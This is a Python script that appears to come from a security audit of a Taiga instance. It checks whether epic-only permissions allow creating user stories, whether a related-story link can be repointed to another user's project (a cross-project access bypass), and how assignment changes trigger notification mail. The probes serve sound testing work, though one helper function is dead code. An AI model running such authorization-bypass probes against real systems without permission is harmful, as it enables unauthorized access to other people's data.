from common import *
s = suffix(); A = f"ca{s}"; M = f"cm{s}"; O2 = f"co{s}"; MO = f"cmo{s}"
mkusers(A, M, O2, MO)
# ---------- C15 ----------
P = mkproject(A, name=f"C15-{s}"); pid = P["id"]
r = mkrole(A, P, "modepic-noaddus", ["view_project","view_epics","modify_epic","view_us"])  # modify_epic but NOT add_us
addm(A, P, M, role=r["id"])
ep = mkepic(A, P, "epic15")
print("=== C15 role perms:", r["permissions"], "(has modify_epic, NOT add_us)")
print("control: member creates a US directly:", end=" "); show(api(M, "POST", "/userstories", {"project": pid, "subject": "direct"}), 160)
before = len(api(A, "GET", f"/userstories?project={pid}").json())
r2 = api(M, "POST", f"/epics/{ep['id']}/related_userstories/bulk_create", dict(epic=ep["id"], project_id=pid, bulk_userstories="Made by epic-only user\nSecond story"))
print("bulk_create related_userstories:", r2.status_code, r2.text[:200])
after = api(A, "GET", f"/userstories?project={pid}").json()
print("US count %d -> %d; subjects now: %s" % (before, len(after), [u["subject"] for u in after]))
# ---------- C16 ----------
Pc = mkproject(A, name=f"C16c-{s}"); pcid = Pc["id"]
rc = mkrole(A, Pc, "modepic", ["view_project","view_epics","modify_epic","view_us","add_us"])
addm(A, Pc, M, role=rc["id"])
epc = mkepic(A, Pc, "caller-epic"); usc = mkus(A, Pc, "caller-us")
link = api(M, "POST", f"/epics/{epc['id']}/related_userstories", dict(epic=epc["id"], user_story=usc["id"])); print("=== C16 setup link:", link.status_code)
# victim project the caller cannot access
PV = mkproject(O2, name=f"C16v-{s}"); vid = PV["id"]
epv = mkepic(O2, PV, "victim-epic"); usv = mkus(O2, PV, "victim-us")
print("caller access to victim project:", api(M, "GET", f"/projects/{vid}").status_code, "| victim epic:", api(M, "GET", f"/epics/{epv['id']}").status_code, "| victim us:", api(M, "GET", f"/userstories/{usv['id']}").status_code)
def lk(): return shell(f"from taiga.projects.epics.models import RelatedUserStory as R; print([(x.id, 'epic', x.epic_id, 'us', x.user_story_id) for x in R.objects.filter(id={link.json().get('id','0') if False else 'x'})])") if False else None
def linkstate(): return shell(f"from taiga.projects.epics.models import RelatedUserStory as R; print([(x.epic_id, x.user_story_id) for x in R.objects.filter(epic_id={epc['id']})])").strip()
print("link before repoint:", linkstate())
print("-- PATCH related_userstories/<us_id> to point the us at the VICTIM epic (cross-project)")
r3 = api(M, "PATCH", f"/epics/{epc['id']}/related_userstories/{usc['id']}", {"epic": epv["id"]}); print(r3.status_code, r3.text[:250])
print("   link after:", linkstate(), "| victim epic links:", shell(f"from taiga.projects.epics.models import RelatedUserStory as R; print([(x.epic_id, x.user_story_id) for x in R.objects.filter(epic_id={epv['id']})])").strip())
print("-- PATCH user_story to the VICTIM's user story (change the us FK of the link)")
r4 = api(M, "PATCH", f"/epics/{epc['id']}/related_userstories/{usc['id']}", {"user_story": usv["id"]}); print(r4.status_code, r4.text[:250])
print("   epic links now:", linkstate())
# ---------- C17 ----------
Pn = mkproject(A, name=f"C17-{s}"); pnid = Pn["id"]
rn = Pn["roles"][0]["id"]
addm(A, Pn, M, role=rn); addm(A, Pn, MO, role=rn)
usn = mkus(A, Pn, "assignable")
import glob, os
maildir = "/root/johto-task4/L3/scratch/mail"
# find container mail path
mc = subprocess.run(["docker","exec","t4-L3-app","sh","-c","ls -d /scratch/mail 2>/dev/null && echo OK"], capture_output=True, text=True).stdout
def mailcount():
    o = subprocess.run(["docker","exec","t4-L3-app","sh","-c","ls /scratch/mail 2>/dev/null | wc -l"], capture_output=True, text=True).stdout.strip(); return int(o or 0)
print("=== C17: notifications on assigned_users changes (mail backend filebased at /scratch/mail)")
# enable watchers/notify: make M and MO watch? assigned_users notification uses signal_assigned_users
cur = api(A, "GET", f"/userstories/{usn['id']}").json(); ver = cur["version"]
m_id, mo_id, a_id = uid(M), uid(MO), uid(A)
def setau(users, note):
    global ver
    c0 = mailcount()
    r = api(A, "PATCH", f"/userstories/{usn['id']}", {"assigned_users": users, "version": ver})
    if r.status_code == 200: ver = r.json()["version"]
    time.sleep(1)
    print(f"  {note}: set assigned_users={users} -> HTTP {r.status_code}; assigned_users now {r.json().get('assigned_users') if r.status_code==200 else r.text[:120]}; new mail files = {mailcount()-c0}")
print("mail dir present:", mc.strip() or "NO")
setau([m_id], "add M")
setau([m_id, mo_id], "add MO (M already assigned -> should M be re-notified?)")
setau([m_id, mo_id], "no change (same set again)")
setau([mo_id], "remove M")
